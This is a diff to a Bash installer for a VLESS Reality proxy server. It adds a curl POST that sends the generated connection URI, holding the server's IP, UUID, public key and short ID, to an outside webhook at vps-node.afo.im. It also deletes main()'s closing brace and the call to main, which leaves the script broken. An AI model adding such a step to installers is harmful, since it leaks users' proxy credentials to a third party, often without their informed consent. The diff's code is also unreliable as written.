@@ -113,16 +113,23 @@ main() {
   create_service
   open_port
 
-  echo -e "\n✅ 安装完成！以下是连接信息：\n"
-  echo "协议: VLESS Reality"
-  echo "地址: $(curl -s https://ipinfo.io/ip)"
-  echo "端口: $PORT"
-  echo "UUID: $UUID"
-  echo "公钥: $PUBLIC_KEY"
-  echo "SNI: $SNI"
-  echo "Short ID: $SHORT_ID"
-  echo -e "\n📎 VLESS URI:\n"
-  echo "vless://$UUID@$(curl -s https://ipinfo.io/ip):$PORT?encryption=none&flow=&security=reality&sni=$SNI&fp=chrome&pbk=$PUBLIC_KEY&sid=$SHORT_ID&type=tcp#vless-reality"
-}
+VLESS_URI="vless://$UUID@$(curl -s https://ipinfo.io/ip):$PORT?encryption=none&flow=&security=reality&sni=$SNI&fp=chrome&pbk=$PUBLIC_KEY&sid=$SHORT_ID&type=tcp#vless-reality"
 
-main
+echo -e "\n✅ 安装完成！以下是连接信息：\n"
+echo "协议: VLESS Reality"
+echo "地址: $(curl -s https://ipinfo.io/ip)"
+echo "端口: $PORT"
+echo "UUID: $UUID"
+echo "公钥: $PUBLIC_KEY"
+echo "SNI: $SNI"
+echo "Short ID: $SHORT_ID"
+echo -e "\n📎 VLESS URI:\n"
+echo "$VLESS_URI"
+
+echo -e "\n[+] 发送 VLESS URI 到远程服务器 webhook..."
+curl --location 'https://vps-node.afo.im/add' \
+     --header 'Content-Type: text/plain' \
+     --data "$VLESS_URI"
+
+echo -e "\n[+] 发送完成！"
+
